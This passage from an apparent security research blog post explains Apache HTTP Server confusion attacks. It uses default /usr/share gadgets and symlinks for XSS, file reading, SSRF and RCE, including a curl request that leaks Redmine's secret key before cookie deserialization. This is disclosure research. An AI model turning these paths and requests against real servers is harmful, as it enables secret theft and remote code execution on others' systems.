&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-2-local-gadget-to-xss&quot;&gt;✔️ 2-2-2. Local Gadget to XSS&lt;/h5&gt;

&lt;p&gt;Next, how to turn this primitive into XSS? On the Ubuntu Desktop environment, LibreOffice, an open-source office suite, is installed by default. We can leverage the language switch feature in the help files to achieve XSS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /usr/share/libreoffice/help/help.html&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// the URL came from LibreOffice help (F1)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getParameterByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/index.html?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;latest/index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, even if the target hasn’t deployed any web application, we can still create XSS using an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; through files that come within the operating system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-3-local-gadget-to-lfi&quot;&gt;✔️ 2-2-3. Local Gadget to LFI&lt;/h5&gt;

&lt;p&gt;What about arbitrary file reading? If the target server has PHP or frontend packages installed, like JpGraph, jQuery-jFeed, or even WordPress or Moodle plugins, their tutorials or debug consoles can become our gadgets, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php&lt;/li&gt;
  &lt;li&gt;/usr/share/javascript/jquery-jfeed/proxy.php&lt;/li&gt;
  &lt;li&gt;/usr/share/moodle/mod/assignment/type/wims/getcsv.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here’s a simple example exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy.php&lt;/code&gt; from jQuery-jFeed to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-2-2-4-local-gadget-to-ssrf&quot;&gt;✔️ 2-2-4. Local Gadget to SSRF&lt;/h5&gt;

&lt;p&gt;Finding an SSRF vulnerability is also a piece of cake, for instance, MagpieRSS offers a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magpie_debug.php&lt;/code&gt; file, which is fabulous gadget for exploiting:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/php/magpierss/scripts/magpie_debug.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;️-2-2-5-local-gadget-to-rce&quot;&gt;✔️ 2-2-5. Local Gadget to RCE&lt;/h5&gt;

&lt;p&gt;So, can we achieve RCE? Hold on, let’s take it step by step! First, This primitive can reapply all known existing attacks again, like an old version of PHPUnit left behind by development or third-party dependencies, can be directly exploited using &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841&quot;&gt;CVE-2017-9841&lt;/a&gt; to execute arbitrary code. Or phpLiteAdmin installed with a read-only copy, which by default has the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. By now, you should see the vast potential of Local Gadgets Manipulation. What remains is to discover even more powerful and universal gadgets!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;⚔️ Primitive 2-3. Jailbreak from Local Gadgets&lt;/h4&gt;

&lt;p&gt;You might ask: “Can’t we really break out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;?” Of course, we can, that brings out our third primitive — &lt;strong&gt;Jailbreak from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;In &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160&quot;&gt;Debian/Ubuntu&lt;/a&gt; distributions of Httpd, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FollowSymLinks&lt;/code&gt; option is explicitly enabled by default. Even in non-Debian/Ubuntu versions, Apache HTTP Server also &lt;a href=&quot;https://httpd.apache.org/docs/current/mod/core.html#options&quot;&gt;implicitly allows Symbolic Links&lt;/a&gt; by default.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;FollowSymLinks&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-2-3-1-jailbreak-from-local-gadgets&quot;&gt;✔️ 2-3-1. Jailbreak from Local Gadgets&lt;/h5&gt;

&lt;p&gt;So, any package that has a Symbolic Link in its installation directory pointing outside of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; can become a stepping-stone to access more gadgets for further exploitation. Here are some useful Symbolic Links we’ve discovered so far:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cacti Log&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti/site/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cacti/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Data&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/data/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/solr/data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/conf/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/solr/conf/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MediaWiki Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/mediawiki/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/mediawiki/config/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SimpleSAMLphp Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/simplesamlphp/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/simplesamlphp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;️-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/h5&gt;

&lt;p&gt;To wrap up our jailbreak primitive, let’s showcase how to perform an RCE using a double-hop Symbolic Link in Redmine. In the default installation of Redmine, there’s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instances/&lt;/code&gt; folder pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;, and within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default/config/&lt;/code&gt; folder points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/redmine/default/&lt;/code&gt; directory, which holds Redmine’s database setting and secret key.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/share/redmine/instances/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /var/lib/redmine/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /var/lib/redmine/config/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /etc/redmine/default/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/redmine/default/
 database.yml    secret_key.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thus, through an insecure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; and two Symbolic Links, we can easily access the application secret key used by Redmine:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 ...
 6d222c3c3a1881c865428edb79a74405
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And since Redmine is a Ruby on Rails application, the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key.txt&lt;/code&gt; is actually the key used for signing and encrypting. The next step should be familiar to those who have attacked RoR before: by embedding malicious Marshal objects, signed and encrypted with the known keys, into cookies, and then achieving remote code execution through Server-Side Deserialization!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-3-handler-confusion&quot;&gt;🔥 3. Handler Confusion&lt;/h3&gt;

&lt;p&gt;The final attack I’m going to introduce is the confusion based on Handler. This attack also leverages a piece of technical debt that has been left over from the legacy architecture of Apache HTTP Server. Let’s quickly understand this technical debt through an example — if today you want to run the classic &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; on Apache HTTP Server, which of the following two directives do you use?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; application/x-httpd-php .php
&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt;    application/x-httpd-php .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer is — both can correctly get PHP running! Here are the two directive syntaxes, and you can see that not only are the usages similar, but even the effects are exactly the same. Why did Apache HTTP Server initially design two different directives doing the same thing?&lt;/p&gt;

&lt;div class=&quot;language-config highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AddHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;span class=&quot;n&quot;&gt;AddType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;media&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Actually, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; represent different fields within Httpd’s internal structure, corresponding to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;, respectively. The fact that &lt;strong&gt;users can use them interchangeably without realizing it is thanks to a piece of code that has been in Apache HTTP Server since &lt;a href=&quot;https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c&quot;&gt;its early development in 1996&lt;/a&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420&quot;&gt;server/config.c#L420&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_CORE_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ap_strchr_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apr_pmemdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;cm&quot;&gt;/* exclude media type arguments */&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* strip trailing spaces */&lt;/span&gt;

                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AP_DEFAULT_HANDLER_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_run_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that before entering the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_run_handler()&lt;/code&gt;, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; is empty, the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; is used as the final module handler. This is also why &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddHandler&lt;/code&gt; have the identical effect, because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; is eventually converted into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; before handling. So, our third Handler Confusion is mainly developed around this behavior.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

